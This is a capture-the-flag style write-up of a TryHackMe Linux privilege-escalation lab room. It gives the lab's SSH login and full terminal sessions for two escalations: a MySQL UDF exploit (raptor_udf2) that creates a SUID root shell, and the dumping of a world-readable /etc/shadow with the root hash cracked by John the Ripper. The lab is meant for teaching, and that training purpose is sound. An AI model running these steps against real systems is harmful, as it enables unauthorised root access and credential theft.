# [Linux_PrivEsc](https://tryhackme.com/room/linuxprivesc#)

| Variable          | Value        |
| ----------------- | ------------ |
| Remote IP         | 10.10.56.56  |
| Local IP          | 10.4.70.23   |
| Local listen port | 80 |

## Credentials

- ssh
  - user:password321

### SSH - 22

- [x] login

```bash
â”Œâ”€â”€(l3ickeyðŸ‘½kali)-[~/l3ickey/pentest-cheat-sheet/thm/Linux_PrivEsc]
â””â”€$ ssh -oHostKeyAlgorithms=+ssh-dss user@10.10.56.56
The authenticity of host '10.10.56.56 (10.10.56.56)' can't be established.
DSA key fingerprint is SHA256:p2NSsfvYJVk1Qe0tsNX5G2h8AaWYRn71jdz3uEodbMA.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.56.56' (DSA) to the list of known hosts.
user@10.10.56.56's password:
Linux debian 2.6.32-5-amd64 #1 SMP Tue May 13 16:34:35 UTC 2014 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri May 15 06:41:23 2020 from 192.168.1.125
user@debian:~$ id
uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)

```

## Linux Privilege Escalation

| Variable          | Value        |
| ----------------- | ------------ |
| Remote IP         | 10.10.56.56  |
| Local IP          | 10.4.70.23   |
| Local listen port | 80 |

```bash
nc -lvp 80
```

### Service Exploits

Compile the `raptor_udf2.c` exploit code.

```bash
user@debian:~$ cd /home/user/tools/mysql-udf/
user@debian:~/tools/mysql-udf$ ls
raptor_udf2.c
user@debian:~/tools/mysql-udf$ gcc -g -c raptor_udf2.c -fPIC
user@debian:~/tools/mysql-udf$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc

```

Connect to the MySQL service as the root user with a blank password.

```bash
user@debian:~/tools/mysql-udf$ mysql -u root
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 36
Server version: 5.1.73-1+deb6u1 (Debian)

Copyright (c) 2000, 2013, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> 

```

Execute the following commands on the MySQL shell to create a User Defined Function (UDF) `do_system` using our compiled exploit:

```sql
mysql> use mysql;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> create table foo(line blob);
Query OK, 0 rows affected (0.00 sec)

mysql> insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
Query OK, 1 row affected (0.00 sec)

mysql> select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
Query OK, 1 row affected (0.00 sec)

mysql> create function do_system returns integer soname 'raptor_udf2.so';
Query OK, 0 row affected (0.00 sec)

```

Use the function to copy `/bin/bash` to `/tmp/rootbash` and set the SUID permission:

```sql
mysql> select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
+------------------------------------------------------------------+
| do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash') |
+------------------------------------------------------------------+
|                                                                0 |
+------------------------------------------------------------------+
1 row in set (0.00 sec)

```

Exit out of the MySQL shell and run the `/tmp/rootbash` executable with `-p` to gain a shell running with root privileges:

```bash
mysql> exit
Bye
user@debian:~/tools/mysql-udf$ /tmp/rootbash -p
rootbash-4.1# id
uid=1000(user) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)

```

### Weak File Permissions - Readable /etc/shadow

Note that the `/etc/shadow` file on the VM is world-readable:

```bash
user@debian:~$ ls -l /etc/shadow
-rw-r--rw- 1 root shadow 837 Aug 25  2019 /etc/shadow

```

View the contents of the `/etc/shadow` file:

```bash
user@debian:~$ cat /etc/shadow
root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::
daemon:*:17298:0:99999:7:::
bin:*:17298:0:99999:7:::
sys:*:17298:0:99999:7:::
sync:*:17298:0:99999:7:::
games:*:17298:0:99999:7:::
man:*:17298:0:99999:7:::
lp:*:17298:0:99999:7:::
mail:*:17298:0:99999:7:::
news:*:17298:0:99999:7:::
uucp:*:17298:0:99999:7:::
proxy:*:17298:0:99999:7:::
www-data:*:17298:0:99999:7:::
backup:*:17298:0:99999:7:::
list:*:17298:0:99999:7:::
irc:*:17298:0:99999:7:::
gnats:*:17298:0:99999:7:::
nobody:*:17298:0:99999:7:::
libuuid:!:17298:0:99999:7:::
Debian-exim:!:17298:0:99999:7:::
sshd:*:17298:0:99999:7:::
user:$6$M1tQjkeb$M1A/ArH4JeyF1zBJPLQ.TZQR1locUlz0wIZsoY6aDOZRFrYirKDW5IJy32FBGjwYpT2O1zrR2xTROv7wRIkF8.:17298:0:99999:7:::
statd:*:17299:0:99999:7:::
mysql:!:18133:0:99999:7:::

```

Save the root user's hash to a file called `hash.txt` on your Kali and use `john the ripper` to crack it.

```bash
â”Œâ”€â”€(l3ickeyðŸŽƒkali)-[~/l3ickey/pentest-cheat-sheet/thm/Linux_PrivEsc]
â””â”€$ cat hash.txt
$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0

â”Œâ”€â”€(l3ickeyðŸŽƒkali)-[~/l3ickey/pentest-cheat-sheet/thm/Linux_PrivEsc]
â””â”€$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 24 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
password123      (?)
1g 0:00:00:00 DONE (2022-06-28 01:45) 5.263g/s 16168p/s 16168c/s 16168C/s 123456..dangerous
Use the "--show" option to display all of the cracked passwords reliably
Session completed.

```

Switch to the root user, using the cracked password:

```bash
user@debian:~$ su root
Password:password123
root@debian:/home/user# id
uid=0(root) gid=0(root) groups=0(root)

```



